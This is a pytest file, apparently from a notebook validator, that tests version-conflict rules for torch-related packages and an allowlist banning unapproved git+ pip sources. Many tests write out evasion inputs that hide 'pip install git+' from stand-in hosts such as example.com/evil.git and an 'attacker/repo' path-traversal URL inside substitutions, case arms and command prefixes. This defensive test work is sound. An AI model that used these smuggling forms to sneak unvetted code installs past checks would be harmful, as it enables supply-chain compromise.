    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                f'!pip install "torch==2.12.0" {stale}', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_git_allowlist_is_scoped_to_each_source():
    """One allowlisted repository on a line must not clear a prohibited one beside it. The
    line-level scan finds every `git+` target; the allowlist then applies to each."""
    nv = _load_notebook_validator_module()

    allowed = "git+https://github.com/unslothai/unsloth-zoo.git"
    evil = "git+https://example.com/evil.git"

    assert nv.rule_inst_001_git_plus(f"!pip install {allowed}", "nb.ipynb", 0) == []
    for cell in (
        f"!pip install {evil}",
        f"!pip install {allowed} ; pip install {evil}",
        f"!pip install {allowed} || pip install {evil}",
        f"!pip install {allowed} {evil}",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
        ), cell

    two_allowed = "!pip install {} git+https://github.com/state-spaces/mamba.git".format(allowed)
    assert nv.rule_inst_001_git_plus(two_allowed, "nb.ipynb", 0) == []


def test_notebook_validator_keeps_the_stricter_of_two_equal_floors():
    """`>=0.8.0,>0.8.0` intersect to the exclusive one, so the installed 0.8.0 still moves."""
    nv = _load_notebook_validator_module()

    for spelling in ("torchcodec>=0.8.0,>0.8.0", "torchcodec>0.8.0,>=0.8.0"):
        assert nv._spec_window(nv.parse_spec(spelling).pins)[5] is True, spelling
        assert nv._effective_version(f'!pip install "{spelling}"', "torchcodec", "0.8.0") == (
            "0.8.0",
            False,
        ), spelling

    # Two inclusive floors still name the endpoint.
    assert nv._effective_version(
        '!pip install "torchcodec>=0.8.0,>=0.8.0"', "torchcodec", "0.8.0"
    ) == ("0.8.0", True)


def test_notebook_validator_reads_a_named_direct_reference():
    """`name @ url` replaces the package even when the archive filename does not name it, so
    the old version cannot be reported as if it were still installed."""
    nv = _load_notebook_validator_module()

    tag = "torchcodec @ https://github.com/meta-pytorch/torchcodec/archive/refs/tags/v0.13.0.zip"
    assert nv._archive_requirement(tag) == ("torchcodec", None)
    assert (
        nv.rule_inst_004_torchcodec_torch(
            f'!pip install "torch==2.12.0" "{tag}"', COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )

    # A named reference whose archive does name a version still yields it, either way.
    wheel = "torchcodec @ https://x/torchcodec-0.10.0-cp312-cp312-manylinux_2_28_x86_64.whl"
    assert nv._archive_requirement(wheel) == ("torchcodec", "0.10.0")
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                f'!pip install "torch==2.11.0" "{wheel}"', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_git_allowlist_matches_the_repository_not_a_substring():
    """An arbitrary repository can carry an allowlisted path inside its own, so the allowlist
    is compared against the normalised host and path."""
    nv = _load_notebook_validator_module()

    assert (
        nv._git_source_repository("git+https://user:pw@github.com/state-spaces/mamba.git@v2.0")
        == "github.com/state-spaces/mamba"
    )
    assert nv._git_source_is_allowed("git+https://github.com/unslothai/unsloth-zoo.git")
    assert not nv._git_source_is_allowed(
        "git+https://evil.example/repo/github.com/unslothai/unsloth.git"
    )

    smuggled = "!pip install git+https://evil.example/repo/github.com/unslothai/unsloth.git"
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))

    # Credentials and a trailing ref do not stop an allowlisted repository from matching.
    assert (
        nv.rule_inst_001_git_plus(
            "!pip install git+https://user:pw@github.com/state-spaces/mamba.git@v2.0", "nb.ipynb", 0
        )
        == []
    )


def test_git_ban_reads_commands_not_the_comment():
    """`_split_chained` drops a shell comment, so a comment naming a prohibited source is
    documentation and must not fail the notebook."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!pip install foo # avoid git+https://example.com/evil.git", "nb.ipynb", 0
        )
        == []
    )
    # The executable half of the same line still counts.
    assert any(
        f.rule == "R-INST-001"
        for f in nv.rule_inst_001_git_plus(
            "!pip install git+https://example.com/evil.git # needed", "nb.ipynb", 0
        )
    )


def test_notebook_validator_ends_a_grouped_and_or_list_at_its_own_operator():
    """Which list an operator belongs to is its group depth. `(A || B && C)` is one list, so
    the `&&` ends the tail; `A || (B && C)` is not, so it does not."""
    nv = _load_notebook_validator_module()

    same_list = '!(pip install foo || pip install bar && pip install "torch==2.12.0")'
    assert [flag for _, flag in nv._split_chained(same_list)] == [False, True, False]
    assert len(nv.rule_inst_004_torchcodec_torch(same_list, COLAB_TORCH211, "nb.ipynb", 0)) == 1

    inner = '!pip install foo || (pip install bar && pip install "torch==2.12.0")'
    assert [flag for _, flag in nv._split_chained(inner)] == [False, True, True]
    assert nv.rule_inst_004_torchcodec_torch(inner, COLAB_TORCH211, "nb.ipynb", 0) == []


def test_notebook_validator_keeps_a_minor_a_narrow_exclusion_cannot_remove():
    """`>=0.11,<0.12,!=0.11.0` still lands in the 0.11 line, and the minor is what the rule
    compares. Only a wildcard over the whole minor takes it away."""
    nv = _load_notebook_validator_module()

    assert nv._exclusion_covers_minor("0.11", "0.11.*")
    assert not nv._exclusion_covers_minor("0.11", "0.11.0")
    assert not nv._exclusion_covers_minor("0.11", "0.11.1.*")

    older = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0"}
    for cell in (
        '!pip install "torchcodec>=0.11,<0.12,!=0.11.0"',
        '!pip install "torchcodec>=0.11,<=0.11.1,!=0.11"',
    ):
        assert len(nv.rule_inst_004_torchcodec_torch(cell, older, "nb.ipynb", 0)) == 1, cell

    # A wildcard over the minor still clears it.
    newer = {"torch": "2.10.0+cu128", "torchcodec": "0.15.0"}
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torchcodec>=0.10,<0.12,!=0.11.*"', newer, "nb.ipynb", 0
        )
        == []
    )


def test_notebook_validator_keeps_an_outer_fallback_across_a_nested_or():
    """Each group keeps its own tail, so an inner `||` cannot hand the outer one back. A
    command is conditional when any level above it is in a fallback."""
    nv = _load_notebook_validator_module()

    nested = (
        "!pip install foo || (pip install bar || pip install baz && " 'pip install "torch==2.12.0")'
    )
    assert [flag for _, flag in nv._split_chained(nested)] == [False, True, True, True]
    assert nv.rule_inst_004_torchcodec_torch(nested, COLAB_TORCH211, "nb.ipynb", 0) == []

    # The grouped head list still ends its own tail at the `&&`.
    same_list = '!(pip install foo || pip install bar && pip install "torch==2.12.0")'
    assert [flag for _, flag in nv._split_chained(same_list)] == [False, True, False]
    assert len(nv.rule_inst_004_torchcodec_torch(same_list, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_lands_an_upward_move_on_an_inclusive_cap():
    """`<=V` allows V, so V is what pip picks, whichever side the version moves from."""
    nv = _load_notebook_validator_module()

    # 0.7 upward into a window that spans minors: the cap names where it stops.
    spanning = '!pip install "torchcodec==0.7.0"\n!pip install "torchcodec>=0.8,<=0.10.0"'
    findings = nv.rule_inst_004_torchcodec_torch(spanning, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1
    assert "torchcodec==0.10.0" in findings[0].message

    # An open floor has no cap to land on and stays a floor, which the ABI remedy needs.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install "torch==2.12.0" "torchcodec>=0.12.0"', COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )


def test_notebook_validator_will_not_keep_a_version_through_an_upgrade():
    """A bare name with `--upgrade` takes the newest release, so the installed version is not
    what the cell ends on. Without the flag pip leaves a satisfied requirement alone."""
    nv = _load_notebook_validator_module()

    # None of these let the installed version satisfy the requirement, so pip resolves from
    # the index and the old version is not what the cell ends on.
    for flag in ("--upgrade", "-U", "--force-reinstall", "--ignore-installed", "-I"):
        cell = f'!pip install {flag} "torch==2.12.0" torchcodec'
        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], flag

    # No flag: the requirement is already satisfied, so 0.11 stays and is reported.
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install "torch==2.12.0" torchcodec', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )

    # A bound still bounds it, forced or not.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install --force-reinstall "torch==2.12.0" "torchcodec>=0.12.0"',
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!pip install --upgrade "torch==2.12.0" "torchcodec>=0.12.0"',
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install --upgrade "torch==2.11.0" "torchcodec==0.10.0"',
                COLAB_TORCH211,
                "nb.ipynb",
                0,
            )
        )
        == 1
    )


def test_notebook_validator_keeps_the_flag_of_the_command_in_hand():
    """A group's closing bracket ends the level, not the command being read: the install
    before the `)` still belongs to the fallback the `||` opened."""
    nv = _load_notebook_validator_module()

    closing = '!(pip install foo || pip install "torch==2.12.0")'
    assert [flag for _, flag in nv._split_chained(closing)] == [False, True]
    assert nv.rule_inst_004_torchcodec_torch(closing, COLAB_TORCH211, "nb.ipynb", 0) == []

    # The same list ending its tail at an `&&` is unchanged.
    ended = '!(pip install foo || pip install bar && pip install "torch==2.12.0")'
    assert [flag for _, flag in nv._split_chained(ended)] == [False, True, False]
    assert len(nv.rule_inst_004_torchcodec_torch(ended, COLAB_TORCH211, "nb.ipynb", 0)) == 1


def test_notebook_validator_reads_a_compound_only_line():
    """With no standalone pip command on the line, every piece kept a keyword and none
    parsed, so the git+ ban never looked. The body runs, but only if its test did."""
    nv = _load_notebook_validator_module()

    for evil in (
        "!if command -v uv; then pip install git+https://example.com/evil.git; fi",
        "!while true; do pip install git+https://example.com/evil.git; done",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
        ), evil

    # The `if` test runs; only the `then` body is conditional, and that is the pip call here,
    # so the version replay leaves it alone.
    guarded = '!if command -v uv; then pip install "torch==2.12.0"; fi'
    assert [flag for _, flag in nv._split_chained(guarded)] == [False, True]
    assert nv.rule_inst_004_torchcodec_torch(guarded, COLAB_TORCH211, "nb.ipynb", 0) == []

    # An unguarded install on its own line still counts.
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install "torch==2.12.0"', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_git_ban_reads_the_arguments_shlex_produced():
    """`"git+"https://...` is one argument to pip and two words to a text scan, so the
    source has to be looked for in the parsed packages as well as in the command text."""
    nv = _load_notebook_validator_module()

    concatenated = '!pip install "git+"https://example.com/evil.git'
    assert any(
        f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(concatenated, "nb.ipynb", 0)
    )

    # The allowlist still applies to the joined argument.
    assert (
        nv.rule_inst_001_git_plus(
            '!pip install "git+"https://github.com/unslothai/unsloth-zoo.git', "nb.ipynb", 0
        )
        == []
    )


def test_notebook_validator_keeps_a_pip_call_used_as_a_test():
    """`if pip install ...` is the condition, reached whenever the line is. Only a `then`,
    `elif`, `else` or `do` body depends on how that condition went."""
    nv = _load_notebook_validator_module()

    older = {"torch": "2.10.0+cu128", "torchcodec": "0.10.0+cu128"}
    for cell in (
        '!pip install foo; if pip install "torch==2.9.0"; then true; fi',
        '!while pip install "torch==2.9.0"; do true; done',
    ):
        assert len(nv.rule_inst_004_torchcodec_torch(cell, older, "nb.ipynb", 0)) == 1, cell

    # A body under an UNKNOWN test stays conditional.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!if command -v uv; then pip install "torch==2.12.0"; fi',
            COLAB_TORCH211,
            "nb.ipynb",
            0,
        )
        == []
    )
    # `while true` loops forever, so its body is reached as surely as a bare command.
    assert [
        f.rule
        for f in nv.rule_inst_004_torchcodec_torch(
            '!while true; do pip install "torch==2.12.0"; done', COLAB_TORCH211, "nb.ipynb", 0
        )
    ] == ["R-INST-004"]


def test_git_ban_only_reads_pip_commands():
    """A `git+` in an `echo` beside an install installs nothing. The scan is per command, and
    only the ones that parse as pip count."""
    nv = _load_notebook_validator_module()

    assert (
        nv.rule_inst_001_git_plus(
            "!echo git+https://example.com/evil.git; pip install numpy", "nb.ipynb", 0
        )
        == []
    )
    assert nv.rule_inst_001_git_plus("!echo git+https://example.com/evil.git", "nb.ipynb", 0) == []

    # The install beside it still counts when it is the one carrying the source.
    assert any(
        f.rule == "R-INST-001"
        for f in nv.rule_inst_001_git_plus(
            "!echo installing; pip install git+https://example.com/evil.git", "nb.ipynb", 0
        )
    )


def test_notebook_validator_evaluates_environment_markers():
    """pip skips a requirement whose marker is false, so replaying its bounds moves a version the
    cell never touches. The environment comes from os-info; without one nothing is judged."""
    nv = _load_notebook_validator_module()

    assert nv._colab_python_version() is not None
    environment = nv._marker_environment(COLAB_TORCH211)
    assert environment is not None
    assert not nv._requirement_applies("torch>=2.12; python_version < '3.10'", environment)
    assert nv._requirement_applies("torch==2.12.0; python_version >= '3.10'", environment)
    assert nv._requirement_applies("torch==2.12.0", environment)
    # An unreadable marker is replayed rather than guessed at.
    assert nv._requirement_applies("torch==2.12.0; nonsense !!", environment)

    for skipped in (
        "!pip install \"torch>=2.12; python_version < '3.10'\"",
        "!pip install \"torch==2.12.0; python_version < '3.10'\"",
        "!pip install 'torch==2.12.0; sys_platform == \"win32\"'",
    ):
        assert (
            nv.rule_inst_004_torchcodec_torch(skipped, COLAB_TORCH211, "nb.ipynb", 0) == []
        ), skipped

    # A marker that holds is replayed, and so is one with no environment to judge it against.
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                "!pip install \"torch==2.12.0; python_version >= '3.10'\"",
                COLAB_TORCH211,
                "nb.ipynb",
                0,
            )
        )
        == 1
    )
    assert nv._marker_environment({}) is None
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install --no-deps "torch==2.12.1; python_version < \'3.10\'" "torchcodec==0.11.1"',
                {},
                "nb.ipynb",
                0,
            )
        )
        == 1
    )


def test_notebook_validator_expands_bundled_short_flags():
    """pip takes `-Uq`, and parse_pip_line keeps it as one token, so the letters are what
    gets compared."""
    nv = _load_notebook_validator_module()

    assert nv._forces_resolution({"-Uq"})
    assert nv._forces_resolution({"-qU"})
    assert nv._forces_resolution({"--upgrade"})
    assert not nv._forces_resolution({"-q"})
    assert not nv._forces_resolution({"--quiet"})

    for flag in ("-Uq", "-qU", "-qI"):
        cell = f'!pip install "torch==2.12.0" {flag} torchcodec'
        assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == [], flag

    # A quiet flag on its own does not re-resolve anything.
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!pip install "torch==2.12.0" -q torchcodec', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def _one_cell_notebook(source: str) -> dict:
    return {"cells": [{"cell_type": "code", "source": source.splitlines(keepends = True)}]}


def test_install_cell_discovery_finds_compound_commands():
    """The rules see only what `install_cells` hands them, and it wanted `pip` right after the
    `!`, so every compound form was invisible whatever the splitter did with it."""
    nv = _load_notebook_validator_module()

    for source in (
        "!pip install torch==2.12.0",
        "!uv pip install torch",
        "!pip uninstall -y torchcodec",
        "!if command -v uv; then pip install git+https://example.com/x.git; fi",
        "!echo start; pip install torch==2.12.0",
        "!pip install foo || (pip install git+https://example.com/x.git)",
    ):
        assert nv.install_cells(_one_cell_notebook(source)), source

    # Still anchored on the `!`, so a pip mention in Python is not an install cell.
    for source in ('cmd = "pip install torch"', "import torch", "# pip install torch"):
        assert nv.install_cells(_one_cell_notebook(source)) == [], source


def test_notebook_validator_splits_on_single_control_operators():
    """`A & B` backgrounds A and runs B, `A | B` runs both. Neither opened a command boundary,
    so a line starting with something other than pip hid the install entirely."""
    nv = _load_notebook_validator_module()

    assert [c for c, _ in nv._split_chained("!sleep 1 & pip install x")] == [
        "!sleep 1",
        "!pip install x",
    ]
    assert [c for c, _ in nv._split_chained("!echo x | pip install y")] == [
        "!echo x",
        "!pip install y",
    ]

    for evil in (
        "!sleep 1 & pip install git+https://example.com/evil.git",
        "!echo x | pip install git+https://example.com/evil.git",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)
        ), evil

    # A redirection is not a separator, and neither is a quoted ampersand.
    assert [c for c, _ in nv._split_chained("!pip install foo > log 2>&1")] == [
        "!pip install foo > log 2>&1"
    ]
    assert nv._split_chained('!pip install "a&b"')[0][0] == '!pip install "a&b"'


def test_torchao_floor_ignores_a_requirement_pip_skips():
    """R-INST-003 reads the floor from the same cell, so a requirement whose marker is false
    must not satisfy it either."""
    nv = _load_notebook_validator_module()

    colab = {"peft": "0.20.0", "torchao": "0.10.0"}
    assert [
        f.rule
        for f in nv.rule_inst_003_peft_torchao(
            "!pip install \"torchao>=0.16.0; python_version < '3.10'\"", colab, "nb.ipynb", 0
        )
    ] == ["R-INST-003"]

    # A marker that holds, and no marker at all, both still clear the floor.
    for cell in (
        "!pip install \"torchao>=0.16.0; python_version >= '3.10'\"",
        '!pip install "torchao>=0.16.0"',
    ):
        assert nv.rule_inst_003_peft_torchao(cell, colab, "nb.ipynb", 0) == [], cell


def test_git_allowlist_resolves_dot_segments_and_matches_exactly():
    """`unslothai/unsloth/../../attacker/repo` reads as an allowlisted prefix and resolves
    elsewhere. Every entry is one `host/org/repo` and pip puts a subdirectory in the
    fragment, so the match is exact."""
    nv = _load_notebook_validator_module()

    assert (
        nv._git_source_repository(
            "git+https://github.com/unslothai/unsloth/../../attacker/repo.git"
        )
        == "github.com/attacker/repo"
    )
    assert not nv._git_source_is_allowed(
        "git+https://github.com/unslothai/unsloth/../../attacker/repo.git"
    )
    assert not nv._git_source_is_allowed("git+https://github.com/unslothai/unsloth/extra.git")

    # The real forms still match: a ref, credentials, a fragment.
    for allowed in (
        "git+https://github.com/unslothai/unsloth.git",
        "git+https://user:pw@github.com/state-spaces/mamba.git@v2.0",
        "git+https://github.com/unslothai/unsloth-zoo.git#subdirectory=x",
    ):
        assert nv._git_source_is_allowed(allowed), allowed

    smuggled = "!pip install git+https://github.com/unslothai/unsloth/../../attacker/repo.git"
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(smuggled, "nb.ipynb", 0))


def test_install_cell_discovery_glues_continuations():
    """A `\\` continuation can put the `!` and the pip call on different physical lines, and
    discovery reads lines."""
    nv = _load_notebook_validator_module()

    source = "!echo ready && \\\n  pip install git+https://example.com/pkg.git"
    assert nv.install_cells(_one_cell_notebook(source))
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(source, "nb.ipynb", 0))


def test_no_deps_rules_skip_a_requirement_pip_skips(monkeypatch):
    """R-INST-002 and R-INST-005 read the raw pins themselves, so a marker-false `--no-deps`
    requirement must not be treated as installed by either."""
    nv = _load_notebook_validator_module()
    monkeypatch.setattr(
        nv,
        "pypi_metadata",
        lambda name, version: {"info": {"requires_dist": ["tokenizers (>=0.30.0)"]}}
        if name.lower() == "transformers"
        else None,
    )
    colab = {"transformers": "5.0.0", "tokenizers": "0.22.2"}

    skipped = "!pip install --no-deps \"transformers==5.5.0; python_version < '3.10'\""
    assert nv.rule_inst_002_no_deps_transitive(skipped, colab, "nb.ipynb", 0) == []
    assert nv.rule_inst_005_transformers_tokenizers(skipped, colab, "nb.ipynb", 0) == []

    for applied in (
        "!pip install --no-deps \"transformers==5.5.0; python_version >= '3.10'\"",
        '!pip install --no-deps "transformers==5.5.0"',
    ):
        assert nv.rule_inst_002_no_deps_transitive(applied, colab, "nb.ipynb", 0), applied
        assert nv.rule_inst_005_transformers_tokenizers(applied, colab, "nb.ipynb", 0), applied


def test_notebook_validator_splits_keywords_on_any_whitespace():
    """A tab after `then` is the same command to the shell. Splitting on a literal space left
    `then\\tpip` as one word, which parses as nothing and hides the install."""
    nv = _load_notebook_validator_module()

    tabbed = "!if true; then\tpip install git+https://example.com/pkg.git; fi"
    assert [c for c, _ in nv._split_chained(tabbed)][-1] == (
        "!pip install git+https://example.com/pkg.git"
    )
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(tabbed, "nb.ipynb", 0))

    spaced = "!if true; then pip install git+https://example.com/pkg.git; fi"
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(spaced, "nb.ipynb", 0))


def test_notebook_validator_comments_after_a_closing_bracket():
    """A `)` ends a word, so `)#` opens a comment and what follows is documentation."""
    nv = _load_notebook_validator_module()

    cell = "!(pip install unsloth)# alternative: pip install git+https://example.com/pkg.git"
    assert [c for c, _ in nv._split_chained(cell)] == ["!pip install unsloth"]
    assert nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0) == []


def test_notebook_validator_declines_markers_it_cannot_judge():
    """`Marker.evaluate` fills any field the environment omits from the running process, so a
    marker naming one would answer for this machine and move between runners."""
    nv = _load_notebook_validator_module()

    environment = nv._marker_environment(COLAB_TORCH211)
    for unknown in (
        "torch>=2.12; platform_release < '5.0'",
        "torch>=2.12; platform_version == 'x'",
        "torch>=2.12; implementation_version > '3'",
    ):
        assert nv._requirement_applies(unknown, environment), unknown

    # The fields the oracle can answer for are still evaluated.
    assert not nv._requirement_applies("torch>=2.12; python_version < '3.10'", environment)
    assert nv._requirement_applies("torch>=2.12; sys_platform == 'linux'", environment)


def test_notebook_validator_reads_case_arms():
    """Stripping `case` left `x in x) pip install ...`, which parses as nothing. Only the
    matching arm runs, so the command is conditional, and the git+ ban still sees it."""
    nv = _load_notebook_validator_module()

    single = "!case x in x) pip install git+https://example.com/pkg.git ;; esac"
    assert nv._split_chained(single) == [("!pip install git+https://example.com/pkg.git", True)]
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(single, "nb.ipynb", 0))

    # A later arm carries no keyword at all, just its own label.
    multi = (
        "!case x in a) pip install git+https://a.example/a.git ;; "
        "b) pip install git+https://b.example/b.git ;; esac"
    )
    assert [c for c, _ in nv._split_chained(multi)] == [
        "!pip install git+https://a.example/a.git",
        "!pip install git+https://b.example/b.git",
    ]
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(multi, "nb.ipynb", 0))

    # Conditional, so the version replay leaves an arm alone.
    assert (
        nv.rule_inst_004_torchcodec_torch(
            '!case x in x) pip install "torch==2.12.0" ;; esac', COLAB_TORCH211, "nb.ipynb", 0
        )
        == []
    )

    # Bash accepts a quoted pattern, and the label still ends at its `)`.
    quoted_pattern = '!case x in "x") pip install git+https://example.com/pkg.git ;; esac'
    assert nv._split_chained(quoted_pattern) == [
        ("!pip install git+https://example.com/pkg.git", True)
    ]
    assert any(
        f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(quoted_pattern, "nb.ipynb", 0)
    )

    # A `)` inside a quoted argument, or inside a substitution, belongs to the command.
    assert nv._unquoted_arm_close('pip install "a)b"') is None
    assert nv._unquoted_arm_close("echo $(date) ; pip install a") is None
    quoted = '!pip install "a)b" git+https://example.com/evil.git'
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(quoted, "nb.ipynb", 0))


def test_notebook_validator_reads_pip_in_a_substitution():
    """`echo $(pip install x)` runs the install as surely as the echo, and the outer command
    is not pip, so the inner one has to be a command of its own."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!echo $(pip install git+https://example.com/pkg.git)",
        "!X=`pip install git+https://example.com/pkg.git`",
        "!echo $(echo $(pip install git+https://example.com/pkg.git))",
    ):
        assert "!pip install git+https://example.com/pkg.git" in [
            command for command, _ in nv._split_chained(cell)
        ], cell
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
        ), cell

    assert nv._substitution_bodies("echo $(pip install x) and `pip install y`") == [
        "pip install x",
        "pip install y",
    ]
    assert nv._substitution_bodies("pip install x") == []


def test_notebook_validator_honours_escaped_case_patterns():
    """A `\\)` in a pattern matches a literal parenthesis, so it is not what closes the arm."""
    nv = _load_notebook_validator_module()

    escaped = "!case 'x)y' in x\\)y) pip install git+https://example.com/pkg.git ;; esac"
    assert nv._split_chained(escaped) == [("!pip install git+https://example.com/pkg.git", True)]
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(escaped, "nb.ipynb", 0))


def test_notebook_validator_ignores_marker_names_in_literals():
    """`sys_platform == 'platform_release'` references one variable, not two, so the marker
    is judged rather than declined."""
    nv = _load_notebook_validator_module()

    environment = nv._marker_environment(COLAB_TORCH211)
    assert not nv._requirement_applies(
        "torch==2.12.0; sys_platform == 'platform_release'", environment
    )
    assert nv._requirement_applies("torch==2.12.0; sys_platform == 'linux'", environment)
    # A real reference to an unknown field is still declined.
    assert nv._requirement_applies("torch>=2.12; platform_release < '5.0'", environment)


def test_notebook_validator_strips_execution_prefixes():
    """`command pip install ...` and `env FOO=1 pip install ...` install exactly as a bare
    `pip install ...` does, so the prefix must not hide them."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!command pip install git+https://example.com/pkg.git",
        "!env FOO=1 pip install git+https://example.com/pkg.git",
        "!FOO=1 pip install git+https://example.com/pkg.git",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
        ), cell

    # The replay reads them too, so a prefixed install still moves the version.
    assert (
        len(
            nv.rule_inst_004_torchcodec_torch(
                '!env FOO=1 pip install "torch==2.12.0"', COLAB_TORCH211, "nb.ipynb", 0
            )
        )
        == 1
    )


def test_notebook_validator_quotes_inside_a_substitution():
    """A `)` inside a quoted argument closes no substitution, so the body runs past it."""
    nv = _load_notebook_validator_module()

    cell = "!echo \"$(printf 'X)'; pip install git+https://example.com/pkg.git)\""
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0))

    # A backtick body survives the assignment-prefix strip, since the bodies are read off the
    # raw pieces.
    assert any(
        f.rule == "R-INST-001"
        for f in nv.rule_inst_001_git_plus(
            "!X=`pip install git+https://example.com/pkg.git`", "nb.ipynb", 0
        )
    )


def test_notebook_validator_tells_a_grouping_close_from_a_substitution_close():
    """`)` ends a word when it closes a grouping and not when it closes a `$( )` inside one,
    so only the first makes a following `#` a comment."""
    nv = _load_notebook_validator_module()

    # Bash prints `ok#suffix` here and runs the install.
    embedded = "!echo $(printf ok)#suffix; pip install git+https://example.com/pkg.git"
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(embedded, "nb.ipynb", 0))

    # A grouping close still opens a comment.
    grouped = "!(pip install unsloth)# git+https://example.com/pkg.git"
    assert nv.rule_inst_001_git_plus(grouped, "nb.ipynb", 0) == []


def test_notebook_validator_ignores_quoted_substitution_text():
    """Single quotes and an escaped `$` make the text literal, so nothing in it runs and the
    notebook must not be failed for it. Double quotes still expand."""
    nv = _load_notebook_validator_module()

    literal = "!echo '$(pip install git+https://example.com/pkg.git)'; pip install unsloth"
    assert nv._substitution_bodies(literal) == []
    assert nv.rule_inst_001_git_plus(literal, "nb.ipynb", 0) == []

    escaped = (
        '!echo "' + chr(92) + '$(pip install git+https://example.com/pkg.git)"; '
        "pip install unsloth"
    )
    assert nv.rule_inst_001_git_plus(escaped, "nb.ipynb", 0) == []

    # A substitution inside double quotes is expanded, so it still counts.
    expanded = "!echo \"$(printf 'X)'; pip install git+https://example.com/pkg.git)\""
    assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(expanded, "nb.ipynb", 0))


def test_notebook_validator_reads_process_substitutions():
    """`<( )` and `>( )` run their commands too."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!cat <(pip install git+https://example.com/pkg.git); pip install unsloth",
        "!tee >(pip install git+https://example.com/pkg.git); pip install unsloth",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
        ), cell


def test_notebook_validator_keeps_substitution_commands_in_order():
    """A substitution runs before its host and its own separators are its own, so its commands
    stay in sequence rather than being split across the line and appended at the end."""
    nv = _load_notebook_validator_module()

    cell = (
        "!echo $(pip install torchcodec==0.12.0; pip install torchcodec==0.11.0); "
        "pip install torch==2.12.0"
    )
    commands = [command for command, _ in nv._split_chained(cell)]
    assert commands[0] == "!pip install torchcodec==0.12.0"
    assert commands[1] == "!pip install torchcodec==0.11.0"
    assert commands[-1] == "!pip install torch==2.12.0"

    # 0.11 is what is left installed, and torch 2.12 does not take it.
    findings = nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)
    assert len(findings) == 1
    assert "torchcodec==0.11.0" in findings[0].message


def test_git_sources_are_matched_case_insensitively():
    """pip normalises `Git+https://` to the same link, so the ban has to see it."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!pip install Git+https://example.com/pkg.git",
        "!pip install GIT+HTTPS://example.com/pkg.git",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
        ), cell

    # The allowlist still clears an allowlisted repository whatever the case.
    assert (
        nv.rule_inst_001_git_plus(
            "!pip install Git+https://github.com/unslothai/unsloth-zoo.git", "nb.ipynb", 0
        )
        == []
    )


def test_notebook_validator_skips_a_prefixs_own_options():
    """`env -u VAR pip install ...` runs pip, and stripping only the word left the options in
    front of it. Rather than an option table per prefix, skip to where pip starts."""
    nv = _load_notebook_validator_module()

    for cell in (
        "!env -u UNUSED pip install git+https://example.com/pkg.git",
        "!sudo -u root pip install git+https://example.com/pkg.git",
    ):
        assert any(
            f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)
        ), cell

    # Only after a prefix: an ordinary command that merely mentions pip is untouched.
    assert (
        nv.rule_inst_001_git_plus(
